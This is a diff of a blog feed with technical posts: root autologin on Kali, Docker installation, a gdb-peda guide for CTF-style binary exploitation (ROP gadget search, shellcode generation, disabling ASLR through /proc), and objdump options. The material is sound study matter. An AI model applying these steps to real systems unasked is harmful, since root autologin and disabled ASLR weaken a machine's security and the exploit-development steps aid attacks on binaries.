+<p>Next, edit <code>/etc/gdm3/daemon.conf</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AutomaticLoginEnable = true</span><br><span class="line">AutomaticLogin = root</span><br></pre></td></tr></table></figure>
+<h3 id="kali20194"><a class="markdownIt-Anchor" href="#kali20194"></a> kali2019.4</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/X11/default-display-manager</span><br><span class="line">/usr/sbin/lightdm</span><br><span class="line"></span><br><span class="line">vim /etc/lightdm/lightdm.conf </span><br><span class="line"></span><br><span class="line">autologin-guest=True</span><br><span class="line">autologin-user=root</span><br><span class="line">autologin-user-timeout=0</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;kali20193&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#kali20193&quot;&gt;&lt;/a&gt; kali2019.3&lt;/h3&gt;
+&lt;p&gt;Kali Linux use &lt;code&gt;GDM3&lt;/code&gt; as a default Disp
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Kali" scheme="http://flamepeak.com/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Kali Win 安装Docker和Docker-Compose</title>
+    <link href="http://flamepeak.com/2019/11/22/Docker-install-on-kali-and-win-20191122/"/>
+    <id>http://flamepeak.com/2019/11/22/Docker-install-on-kali-and-win-20191122/</id>
+    <published>2019-11-22T01:16:49.000Z</published>
+    <updated>2019-12-09T09:32:10.320Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="on-kali"><a class="markdownIt-Anchor" href="#on-kali"></a> On Kali</h2>
+<h3 id="preparation"><a class="markdownIt-Anchor" href="#preparation"></a> Preparation</h3>
+<p>Add Docker PGP key:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -</span><br></pre></td></tr></table></figure>
+<p>Configure Docker APT repository (Kali is based on Debian testing, which will be called buster upon release, and Docker now has support for it):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'deb [arch=amd64] https://download.docker.com/linux/debian buster stable'</span> &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+<h3 id="install-docker"><a class="markdownIt-Anchor" href="#install-docker"></a> Install Docker</h3>
+<p>If you had older versions of Docker installed, uninstall them:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure>
+<p>Install Docker:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce</span><br></pre></td></tr></table></figure>
+<h4 id="test"><a class="markdownIt-Anchor" href="#test"></a> Test</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
+<p>After installation, Docker service will be started, but not enabled (i.e. it will not be started automatically after reboot). To start it:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+<p>To start Docker automatically upon reboot (do it on your own risk!):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="install-docker-compose"><a class="markdownIt-Anchor" href="#install-docker-compose"></a> Install Docker-Compose</h3>
+<h4 id="install"><a class="markdownIt-Anchor" href="#install"></a> Install</h4>
+<ol>
+<li>Run this command to download the current stable release of Docker Compose:</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-<span class="variable">$(uname -s)</span>-<span class="variable">$(uname -m)</span>"</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Apply executable permissions to the binary:</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
+<p><strong>Note</strong>: If the command <code>docker-compose</code> fails after installation, check your path. You can also create a symbolic link to <code>/usr/bin</code>or any other directory in your path.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>
+<h4 id="test-2"><a class="markdownIt-Anchor" href="#test-2"></a> Test</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker-compose --version</span><br><span class="line">docker-compose version 1.24.1, build 1110ad01</span><br></pre></td></tr></table></figure>
+<h2 id="on-win"><a class="markdownIt-Anchor" href="#on-win"></a> On Win</h2>
+<p>win7、win8 等需要利用 docker toolbox 来安装，国内可以使用阿里云的镜像来下载，下载地址：<a href="http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/" target="_blank" rel="noopener">http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/</a></p>
+<p>官网下载的desktop安装包，无法直接在win7运行，可以在win10运行</p>
+<p>docker toolbox 是一个工具集，它主要包含以下一些内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker CLI 客户端，用来运行docker引擎创建镜像和容器</span><br><span class="line">Docker Machine. 可以让你在windows的命令行中运行docker引擎命令</span><br><span class="line">Docker Compose. 用来运行docker-compose命令</span><br><span class="line">Kitematic. 这是Docker的GUI版本</span><br><span class="line">Docker QuickStart shell. 这是一个已经配置好Docker的命令行环境</span><br><span class="line">Oracle VM Virtualbox. 虚拟机</span><br></pre></td></tr></table></figure>
+<p>注意：安装路径千万不要有中文！！！！</p>
+<p>可以参考：<a href="%5Bhttps://blog.chemcyber.com/2017/05/18/windows7%E4%B8%8B%E5%AE%89%E8%A3%85docker%E3%80%81%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E5%92%8C%E8%BF%90%E8%A1%8Copentsdb%E5%AE%B9%E5%99%A8/%5D(https://blog.chemcyber.com/2017/05/18/windows7%E4%B8%8B%E5%AE%89%E8%A3%85docker%E3%80%81%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E5%92%8C%E8%BF%90%E8%A1%8Copentsdb%E5%AE%B9%E5%99%A8/)">Windows7下安装Docker、下载镜像和运行OpenTsdb容器</a></p>
+<p>通过Git Bash(CMD)查看docker是否安装成功，输入<code>docker-machine</code>，出现版本等信息，安装能够运行，还会给出一些选项，包括machine安装路劲等</p>
+<p>查看一些配置：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine config</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;on-kali&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#on-kali&quot;&gt;&lt;/a&gt; On Kali&lt;/h2&gt;
+&lt;h3 id=&quot;preparation&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pre
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Docker" scheme="http://flamepeak.com/tags/Docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>gdb和gdb-peda安装、使用与调试</title>
+    <link href="http://flamepeak.com/2019/10/30/gdb-and-gdb-peda-usage-and-debug/"/>
+    <id>http://flamepeak.com/2019/10/30/gdb-and-gdb-peda-usage-and-debug/</id>
+    <published>2019-10-30T11:42:11.000Z</published>
+    <updated>2019-12-02T06:44:35.855Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>gdb-peda安装</strong></p>
+<p>gdb安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gdb</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<p><strong>gdb-peda测试</strong></p>
+<p>运行gdb，查看是否出错，是否显示<code>gdb-peda$</code></p>
+<p>参考<a href="https://introspelliam.github.io/2017/08/03/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">上善若水</a></p>
+<h3 id="1-调试的快捷键"><a class="markdownIt-Anchor" href="#1-调试的快捷键"></a> 1. 调试的快捷键</h3>
+<p><font color="#f00">peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍</font></p>
+<h4 id="11-基础的调试快捷键"><a class="markdownIt-Anchor" href="#11-基础的调试快捷键"></a> 1.1 基础的调试快捷键</h4>
+<ul>
+<li>s step，si步入</li>
+<li>n 执行下一条指令  ni步入</li>
+<li>b 在某处下断点，可以用
+<ul>
+<li>b * adrress</li>
+<li>b function_name</li>
+<li>info b  查看断点信息</li>
+<li>delete 1删除第一个断点</li>
+</ul>
+</li>
+<li>c 继续</li>
+<li>r 执行</li>
+<li>disas addr 查看addr处前后的反汇编代码</li>
+</ul>
+<h4 id="12-显示数据"><a class="markdownIt-Anchor" href="#12-显示数据"></a> 1.2 显示数据</h4>
+<ul>
+<li>p 系列
+<ul>
+<li>p system/main  显示某个函数地址
+<ul>
+<li>p $esp	显示寄存器</li>
+</ul>
+</li>
+<li>p/x  p/a p/b p/s。。。</li>
+<li>p 0xff - 0xea   <font color="#f00">计算器</font></li>
+<li>print &amp;VarName 查看变量地址</li>
+<li>p * 0xffffebac   查看某个地址处的值</li>
+</ul>
+</li>
+<li>x系列
+<ul>
+<li>x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
+<li>x/x $esp 查看esp寄存器中的值</li>
+<li>x/s addr 查看addr处的字符串</li>
+<li>x/b addr 查看addr处的字符</li>
+<li>x/i  addr 查看addr处的反汇编结果</li>
+</ul>
+</li>
+<li>info系列
+<ul>
+<li>info register $ebp  查看寄存器ebp中的内容 (简写为 i r ebp)</li>
+<li>i r eflags 查看状态寄存器</li>
+<li>i r ss        查看段寄存器</li>
+<li>i b            查看断点信息</li>
+<li>i functions  查看所有的函数</li>
+</ul>
+</li>
+<li>disas addr 查看addr处前后的反汇编代码</li>
+<li>stack 20   查看栈内20个值</li>
+<li>show args  查看参数</li>
+<li>vmmap 查看映射状况 <font color="#f00">peda带有</font></li>
+<li>readelf 查看elf文件中各个段的起始地址  <font color="#f00">peda带有</font></li>
+<li>parseheap 显示堆状况  <font color="#f00">peda带有</font></li>
+</ul>
+<h4 id="13-查找数据"><a class="markdownIt-Anchor" href="#13-查找数据"></a> 1.3 查找数据</h4>
+<ul>
+<li>find 查找字符串    <font color="#f00">peda带有</font></li>
+<li>searchmem 查找字符串  <font color="#f00">peda带有</font></li>
+<li>ropsearch “xor eax,eax;ret”  0x08048080 0x08050000   查找某段的rop  <font color="#f00">peda带有</font></li>
+<li>ropgadget  提供多个pop|ret可行结果  <font color="#f00">peda带有</font></li>
+</ul>
+<h4 id="14-修改数据"><a class="markdownIt-Anchor" href="#14-修改数据"></a> 1.4 修改数据</h4>
+<ul>
+<li>set $esp=0x110  修改寄存器的值</li>
+<li>set *0xf7ff3234=0x08042334 修改内存的值</li>
+<li>set args “asdasg” “afdasgasg” “agasdsa”  分别给参数1,2,3赋值</li>
+<li>set args “`python -c ‘print “1234\x7f\xde”’`”    这个参数中用python脚本重写了一下，避免有些字符无法正确设置</li>
+<li>r “arg1” “arg2” “arg3”   设置参数</li>
+<li>run `$(perl -e ‘print &quot;A&quot;x20’)`</li>
+</ul>
+<h4 id="11-peda插件"><a class="markdownIt-Anchor" href="#11-peda插件"></a> 1.1 peda插件</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.</span><br><span class="line">Add commands to support debugging and exploit development (for a full list of commands use peda help):</span><br><span class="line">aslr -- Show/set ASLR setting of GDB</span><br><span class="line">checksec -- Check for various security options of binary</span><br><span class="line">dumpargs -- Display arguments passed to a function when stopped at a call instruction</span><br><span class="line">dumprop -- Dump all ROP gadgets in specific memory range</span><br><span class="line">elfheader -- Get headers information from debugged ELF file</span><br><span class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</span><br><span class="line">lookup -- Search for all addresses/references to addresses which belong to a memory range</span><br><span class="line">patch -- Patch memory start at an address with string/hexstring/int</span><br><span class="line">pattern -- Generate, search, or write a cyclic pattern to memory</span><br><span class="line">procinfo -- Display various info from /proc/pid/</span><br><span class="line">pshow -- Show various PEDA options and other settings</span><br><span class="line">pset -- Set various PEDA options and other settings</span><br><span class="line">readelf -- Get headers information from an ELF file</span><br><span class="line">ropgadget -- Get common ROP gadgets of binary or library</span><br><span class="line">ropsearch -- Search for ROP gadgets in memory</span><br><span class="line">searchmem|find -- Search for a pattern in memory; support regex search</span><br><span class="line">shellcode -- Generate or download common shellcodes.</span><br><span class="line">skeleton -- Generate python exploit code template</span><br><span class="line">vmmap -- Get virtual mapping address ranges of section(s) in debugged process</span><br><span class="line">xormem -- XOR a memory region with a key</span><br></pre></td></tr></table></figure>
+<p><strong>vmmap：查看当前程序映射的内存块</strong><br>
+<strong>dumprop：</strong></p>
+<h3 id="2-查找某个plt-got-plt_2"><a class="markdownIt-Anchor" href="#2-查找某个plt-got-plt_2"></a> 2. 查找某个plt、got、plt_2</h3>
+<ul>
+<li>plt 可以直接使用pwntools中的ELF(elf).symbols(function_name)</li>
+<li>got 可以直接使用pwntools中的ELF(elf).got(function_name)</li>
+<li>plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name)</li>
+</ul>
+<h3 id="3-查找程序所动态链接的库"><a class="markdownIt-Anchor" href="#3-查找程序所动态链接的库"></a> 3. 查找程序所动态链接的库</h3>
+<ul>
+<li>
+<p>file pwn3</p>
+<ul>
+<li>pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped</li>
+</ul>
+</li>
+<li>
+<p>checksec pwn3</p>
+<ul>
+<li>[*] ‘/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3’<br>
+Arch:     i386-32-little<br>
+RELRO:    Partial RELRO<br>
+Stack:    No canary found<br>
+NX:       NX enabled<br>
+PIE:      No PIE (0x8048000)</li>
+</ul>
+</li>
+<li>
+<p>ldd pwn3</p>
+<ul>
+<li>
+<pre><code>linux-gate.so.1 (0xf77ad000)
+</code></pre>
+libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)<br>
+/lib/ld-linux.so.2 (0x56601000)</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-编译32位可执行文件"><a class="markdownIt-Anchor" href="#4-编译32位可执行文件"></a> 4. 编译32位可执行文件</h3>
+<ul>
+<li>
+<p>gcc -m32 test.c -o test</p>
+<ul>
+<li>一般而言此时的目标文件为32位，且不能生成调试信息</li>
+</ul>
+</li>
+<li>
+<p>gcc -m32 -g test.c -o test</p>
+<ul>
+<li>
+<p>生成的目标文件是32位，且可以利用操作系统的“原生格式（native format）”生成调试</p>
+<p>信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息</p>
+</li>
+</ul>
+</li>
+<li>
+<p>其它保护状态的开启，请参考<a href="/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"><em>linux程序的常用保护机制</em></a></p>
+</li>
+</ul>
+<h3 id="5-开启pie之后的调试"><a class="markdownIt-Anchor" href="#5-开启pie之后的调试"></a> 5. 开启PIE之后的调试</h3>
+<p>开启PIE之后，地址会一直在变，这十分不利于gdb的调试，所以这时候应该在本地关闭ASLR</p>
+<p>常用的方法是：echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
+<p>开启的方式是：echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
+<h3 id="6-运行时查看文件执行"><a class="markdownIt-Anchor" href="#6-运行时查看文件执行"></a> 6. 运行时查看文件执行</h3>
+<p>做了一道题，在你不执行的时候，只能找到相对地址，但是下断点需要实际的执行地址。若关闭PIE，那么每次的执行地址将会一致，这个时候就需要找到执行的开始地址。peda的常用指令中有vmmap，可以找到实际地址。</p>
+<p>这道题很让人苦恼的是，如果gdb中执行run，那么将陷入循环而不能使用vmmap，若强制结束，最后vmmap会报错。这个时候，就有另外的一些办法：</p>
+<ul>
+<li>执行./pwn &amp;，这个时候会将pwn程序放入后台，而且你能快速知道这个程序的PID，这个时候cat /proc/pwn的PID/maps，就能找到对应的执行时地址。之后kill -9 pwn的PID</li>
+<li>编写一个小脚本，任意放置一个断点，并开启gdb调试，这个时候断点会崩溃，但是gdb-peda中使用vmmap仍能找到对应地址</li>
+</ul>
+<h3 id="gdb使用之layout"><a class="markdownIt-Anchor" href="#gdb使用之layout"></a> gdb使用之layout</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">layout：用于分割窗口，可以一边查看代码，一边测试。主要有以下几种用法：</span><br><span class="line">layout src：显示源代码窗口</span><br><span class="line">layout asm：显示汇编窗口</span><br><span class="line">layout regs：显示源代码/汇编和寄存器窗口</span><br><span class="line">layout split：显示源代码和汇编窗口</span><br><span class="line">layout next：显示下一个layout</span><br><span class="line">layout prev：显示上一个layout</span><br><span class="line">Ctrl + L：刷新窗口</span><br><span class="line">Ctrl + x，再按1：单窗口模式，显示一个窗口</span><br><span class="line">Ctrl + x，再按2：双窗口模式，显示两个窗口</span><br><span class="line">Ctrl + x，再按a：回到传统模式，即退出layout，回到执行layout之前的调试窗口。</span><br></pre></td></tr></table></figure>
+<p>ROPgadget --binary --string ‘/bin/sh’</p>
+<h3 id="gdb-peda不是完美的"><a class="markdownIt-Anchor" href="#gdb-peda不是完美的"></a> gdb-peda不是完美的</h3>
+<p>gdb-peda不是完美的，有些在gdb下正常工作的命令，在gdb-peda中会报错。比如find</p>
+<p>一个例子可以参考，<a href="http://www.vuln.cn/6645" target="_blank" rel="noopener">Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</a>，在level2的pwn过程中，如果在peda下运行find会出错，但是在gdb下很好的返回正确结果</p>
+<p>那么，已经安装了peda，我该怎么办？卸载吗？</p>
+<p>不需要！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Actually peda-gdb doesn&apos;t really install a executable in your computer.</span><br><span class="line"></span><br><span class="line">All the peda-gdb does is to modify the config file of gdb. This file is by default located at ~/.gdbinit.</span><br><span class="line"></span><br><span class="line">use cat ~/.gdbinit can you peek how does peda do</span><br></pre></td></tr></table></figure>
+<p>返回纯净的gdb模式，有两种办法：<br>
+一是，不需要卸载的方法，推荐使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb --nx</span><br><span class="line">或者</span><br><span class="line">gdb -nx</span><br></pre></td></tr></table></figure>
+<p>This is a better way, since you may need peda someday</p>
+<p>二是，卸载：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -rf ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<p>This will remove the config file of gdb, so what peda did will have no effect on your gdb now.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;gdb-peda安装&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;gdb安装&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-get 
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="gdb" scheme="http://flamepeak.com/tags/gdb/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux 二进制分析常用工具和命令</title>
+    <link href="http://flamepeak.com/2019/10/22/Linux-binary-analysis-tools-collections-20191022/"/>
+    <id>http://flamepeak.com/2019/10/22/Linux-binary-analysis-tools-collections-20191022/</id>
+    <published>2019-10-22T00:16:23.000Z</published>
+    <updated>2019-12-02T06:43:07.599Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="xxd"><a class="markdownIt-Anchor" href="#xxd"></a> XXD</h3>
+<hr>
+<h3 id="objdump"><a class="markdownIt-Anchor" href="#objdump"></a> objdump</h3>
+<p>objdump命令是Linux下的反汇编目标文件或者可执行文件的命令，它以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。</p>
+<p><a href="https://blog.csdn.net/q2519008/article/details/82349869" target="_blank" rel="noopener">objdump命令解析</a></p>
+<p>参数选项:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--archive-headers </span><br><span class="line">-a </span><br><span class="line">显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 </span><br><span class="line"></span><br><span class="line">-b bfdname </span><br><span class="line">--target=bfdname </span><br><span class="line">指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： </span><br><span class="line"></span><br><span class="line">objdump -b oasys -m vax -h fu.o </span><br><span class="line">显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 </span><br><span class="line"></span><br><span class="line">-C </span><br><span class="line">--demangle </span><br><span class="line">将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 </span><br><span class="line"></span><br><span class="line">--debugging </span><br><span class="line">-g </span><br><span class="line">显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。</span><br><span class="line">有些其他的格式被readelf -w支持。 </span><br><span class="line"></span><br><span class="line">-e </span><br><span class="line">--debugging-tags </span><br><span class="line">类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 </span><br><span class="line"></span><br><span class="line">--disassemble </span><br><span class="line">-d </span><br><span class="line">从objfile中反汇编那些特定指令机器码的section。 </span><br><span class="line"></span><br><span class="line">-D </span><br><span class="line">--disassemble-all </span><br><span class="line">与 -d 类似，但反汇编所有section. </span><br><span class="line"></span><br><span class="line">--prefix-addresses </span><br><span class="line">反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 </span><br><span class="line"></span><br><span class="line">-EB </span><br><span class="line">-EL </span><br><span class="line">--endian=&#123;big|little&#125; </span><br><span class="line">指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. </span><br><span class="line"></span><br><span class="line">-f </span><br><span class="line">--file-headers </span><br><span class="line">显示objfile中每个文件的整体头部摘要信息。 </span><br><span class="line"></span><br><span class="line">-h </span><br><span class="line">--section-headers </span><br><span class="line">--headers </span><br><span class="line">显示目标文件各个section的头部摘要信息。 </span><br><span class="line"></span><br><span class="line">-H </span><br><span class="line">--help </span><br><span class="line">简短的帮助信息。 </span><br><span class="line"></span><br><span class="line">-i </span><br><span class="line">--info </span><br><span class="line">显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 </span><br><span class="line"></span><br><span class="line">-j name</span><br><span class="line">--section=name </span><br><span class="line">仅仅显示指定名称为name的section的信息 </span><br><span class="line"></span><br><span class="line">-l</span><br><span class="line">--line-numbers </span><br><span class="line">用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，</span><br><span class="line">在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 </span><br><span class="line"></span><br><span class="line">-m machine </span><br><span class="line">--architecture=machine </span><br><span class="line">指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records),</span><br><span class="line">这个选项很有用。可以用-i选项列出这里能够指定的架构. </span><br><span class="line"></span><br><span class="line">--reloc </span><br><span class="line">-r </span><br><span class="line">显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 </span><br><span class="line"></span><br><span class="line">--dynamic-reloc </span><br><span class="line">-R </span><br><span class="line">显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 </span><br><span class="line"></span><br><span class="line">-s </span><br><span class="line">--full-contents </span><br><span class="line">显示指定section的完整内容。默认所有的非空section都会被显示。 </span><br><span class="line"></span><br><span class="line">-S </span><br><span class="line">--source </span><br><span class="line">尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 </span><br><span class="line"></span><br><span class="line">--show-raw-insn </span><br><span class="line">反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 </span><br><span class="line"></span><br><span class="line">--no-show-raw-insn </span><br><span class="line">反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 </span><br><span class="line"></span><br><span class="line">--start-address=address </span><br><span class="line">从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 </span><br><span class="line"></span><br><span class="line">--stop-address=address </span><br><span class="line">显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 </span><br><span class="line"></span><br><span class="line">-t </span><br><span class="line">--syms </span><br><span class="line">显示文件的符号表入口。类似于nm -s提供的信息 </span><br><span class="line"></span><br><span class="line">-T </span><br><span class="line">--dynamic-syms </span><br><span class="line">显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 </span><br><span class="line"></span><br><span class="line">-V </span><br><span class="line">--version </span><br><span class="line">版本信息 </span><br><span class="line"></span><br><span class="line">--all-headers </span><br><span class="line">-x </span><br><span class="line">显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 </span><br><span class="line"></span><br><span class="line">-z </span><br><span class="line">--disassemble-zeroes </span><br><span class="line">一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 </span><br><span class="line"></span><br><span class="line">@file </span><br><span class="line">可以将选项集中到一个文件中，然后使用这个@file选项载入。</span><br></pre></td></tr></table></figure>
+<p>关于符号表字段下面直接只介绍部分常用的：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text：已编译程序的机器代码。</span><br><span class="line">.rodata：只读数据，比如printf语句中的格式串和开关（switch）语句的跳转表。</span><br><span class="line">.data：已初始化的全局C变量。局部C变量在运行时被保存在栈中，既不出现在.data中，也不出现在.bss节中。</span><br><span class="line">.bss：未初始化的全局C变量。在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分初始化</span><br><span class="line">	  和未初始化变量是为了空间效率在：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。</span><br><span class="line">.symtab：一个符号表（symbol table），它存放在程序中被定义和引用的函数和全局变量的信息。一些程序员</span><br><span class="line">      错误地认为必须通过-g选项来编译一个程序，得到符号表信息。实际上，每个可重定位目标文件在.symtab中</span><br><span class="line">      都有一张符号表。然而，和编译器中的符号表不同，.symtab符号表不包含局部变量的表目。</span><br><span class="line">.rel.text：当链接噐把这个目标文件和其他文件结合时，.text节中的许多位置都需要修改。一般而言，任何调用</span><br><span class="line">      外部函数或者引用全局变量的指令都需要修改。另一方面调用本地函数的指令则不需要修改。注意，可执行</span><br><span class="line">      目标文件中并不需要重定位信息，因此通常省略，除非使用者显式地指示链接器包含这些信息。</span><br><span class="line">.rel.data：被模块定义或引用的任何全局变量的信息。一般而言，任何已初始化全局变量的初始值是全局变量或者</span><br><span class="line">      外部定义函数的地址都需要被修改。</span><br><span class="line">.debug：一个调试符号表，其有些表目是程序中定义的局部变量和类型定义，有些表目是程序中定义和引用的全局变量，</span><br><span class="line">      有些是原始的C源文件。只有以-g选项调用编译驱动程序时，才会得到这张表。</span><br><span class="line">.line：原始C源程序中的行号和.text节中机器指令之间的映射。只有以-g选项调用编译驱动程序时，才会得到这张表。</span><br><span class="line">.strtab：一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是</span><br><span class="line">      以null结尾的字符串序列。</span><br></pre></td></tr></table></figure>
+<p>使用举例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#反汇编应用程序</span></span><br><span class="line">objdump -d  main.o  </span><br><span class="line"></span><br><span class="line"><span class="comment">#显示文件头信息 </span></span><br><span class="line">objdump -f main.o</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示制定section段信息(comment段)</span></span><br><span class="line">objdump -s -j .comment main.o</span><br><span class="line"></span><br><span class="line">objdump -b binary -m i386 -D sh.bin</span><br></pre></td></tr></table></figure>
+<h3 id="查看进程所用空间可写或可执行权限"><a class="markdownIt-Anchor" href="#查看进程所用空间可写或可执行权限"></a> 查看进程所用空间可写或可执行权限</h3>
+<p>显示进程映射了的内存区域和访问权限</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cat /proc/`pidof yourProcessName`/maps</span><br><span class="line"><span class="comment">#注意不是引号</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="nc"><a class="markdownIt-Anchor" href="#nc"></a> nc</h3>
+<p><a href="https://www.cnblogs.com/zzPrince/p/6842951.html" target="_blank" rel="noopener">linux ncat命令</a></p>
+<p>server:</p>
